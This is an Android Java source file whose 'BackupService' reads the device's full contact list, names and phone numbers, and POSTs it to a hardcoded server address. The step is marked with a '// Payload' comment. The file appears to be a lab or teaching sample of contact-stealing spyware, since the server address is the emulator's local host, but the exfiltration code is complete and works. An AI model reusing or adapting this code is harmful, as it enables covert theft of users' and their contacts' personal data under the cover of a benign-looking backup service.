package com.example.service;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

abstract class ServiceCheckRunning extends IntentService {

    public ServiceCheckRunning() {
        super("Service");
    }

    protected static volatile boolean isServiceRunning = false;

    public static boolean isRunning() {
        return isServiceRunning;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        isServiceRunning = true;
    }

    @Override
    public void onDestroy() {
        isServiceRunning = false;
        super.onDestroy();
    }
}

class ContactReader {
    static class Contact {
        public String id;
        public String name  = "";
        public String phone = "";
    }

    @SuppressLint("Range")
    private String getParamFromCursor(Cursor cursor, String param) {
        return cursor.getString(cursor.getColumnIndex(param));
    }

    public ArrayList<Contact> readContacts(Context context) {
        ArrayList<Contact> contactsList = new ArrayList<>(10);
        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor.getCount() > 0) {
            while(cursor.moveToNext()) {
                Contact contact = new Contact();

                contact.id = getParamFromCursor(cursor, ContactsContract.Contacts._ID);
                contact.name = getParamFromCursor(cursor, ContactsContract.Contacts.DISPLAY_NAME);
                int hasPhone = Integer.parseInt(
                        getParamFromCursor(cursor, ContactsContract.Contacts.HAS_PHONE_NUMBER));

                if (hasPhone > 0) {
                    // extract phone number
                    Cursor cursor1 = context.getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contact.id},null);

                    while(cursor1.moveToNext()) {
                        contact.phone = getParamFromCursor(cursor1,
                                ContactsContract.CommonDataKinds.Phone.NUMBER);
                    }

                    cursor1.close();
                }

                contactsList.add(contact);
            }
        }

        cursor.close();

        return contactsList;
    }
}

public class BackupService extends ServiceCheckRunning {

    private final String DOMAIN = "http://10.0.2.2";

    private final ContactReader contactReader = new ContactReader();

    @Override
    protected void onHandleIntent(Intent intent) {
        super.onHandleIntent(intent);
        Log.d("onHandleIntent", "isServiceRunning=" + isServiceRunning);

        // Payload
        System.out.println("Read contacts...");
        List<ContactReader.Contact> contactsList = contactReader.readContacts(this);

        for (ContactReader.Contact contact : contactsList) {
            System.out.println("Contact: " + contact.id +  " "  +
                    contact.name +  " " + contact.phone);
        }

        System.out.println("Send to server");

        try {
            sendToServer(contactsList);
        } catch (ConnectException ex) {
            System.out.println("Connection exception");
            return;
        } catch (IOException ex) {
            ex.printStackTrace();
        }

        List<String> contactsListString = MainActivity.lastContacts;
        contactsListString.clear();

        for (ContactReader.Contact contact : contactsList) {
            contactsListString.add("\"" + contact.name + "\" 8 " + contact.phone);
        }
    }

    private String makePostData(final List<ContactReader.Contact> contacts) {
        Map<String, List<String>> map = new LinkedHashMap<>();
        try {
            for (ContactReader.Contact contact : contacts) {
                Field[] fields = contact.getClass().getDeclaredFields();
                for (Field field : fields) {
                    String key = field.getName();
                    String value = (String) field.get(contact);

                    List<String> list = map.get(key);
                    if (list == null) {
                        list = new ArrayList<>();
                        list.add(value);

                        map.put(key, list);
                    } else {
                        list.add(value);
                    }
                }
            }
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String, List<String>> param : map.entrySet()) {
            postData.append(param.getKey());
            postData.append("=");
            postData.append(param.getValue());
            postData.append("&");
        }

        if (postData.charAt(postData.length() - 1) == '&') {
            postData.deleteCharAt(postData.length() - 1);
        }

        return postData.toString();
    }

    private void sendToServer(final List<ContactReader.Contact> contacts) throws IOException {

        String postData = makePostData(contacts);

        // Make connection
        URL url = new URL(DOMAIN);
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();

        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; " +
                    "charset=UTF-8");
        connection.setRequestProperty("Content-Length", String.valueOf(postData.length()));
        connection.connect();

        //Send request
        DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
        wr.writeBytes(postData);
        wr.flush();
        wr.close ();

        System.out.println("send request");

        BufferedReader rd = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String line;
        while ((line = rd.readLine()) != null) {
            System.out.println("Line: " + line);
        }

        wr.close();
        rd.close();
    }
}
